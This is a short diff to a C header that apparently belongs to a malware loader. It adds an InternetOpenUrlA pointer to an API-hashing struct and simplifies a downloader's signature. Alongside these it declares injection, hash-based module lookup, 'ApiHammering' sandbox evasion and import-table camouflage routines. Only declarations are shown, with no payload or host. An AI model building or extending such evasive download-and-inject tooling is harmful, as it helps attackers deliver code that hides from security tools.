@@ -23,6 +23,7 @@ typedef struct _API_HASHING {
 	fnInternetReadFile              pInternetReadFile;
 	fnInternetCloseHandle           pInternetCloseHandle;
 	fnLoadLibraryA					pLoadLibraryA;
+	fnInternetOpenUrlA				pInternetOpenUrlA;
 } API_HASHING, * PAPI_HASHING;
 
 // inject.c
@@ -38,7 +39,7 @@ HMODULE GetModuleHandleH(DWORD dwModuleNameHash);
 BOOL ApiHammering(DWORD Stress);
 
 // downloader.c
-DWORD Download(char** response, PVOID url, PVOID endpoint, BOOL ssl);
+DWORD Download(char** response, char* url, BOOL ssl);
 
 //iatcamo.c
 VOID IatCamouflage();
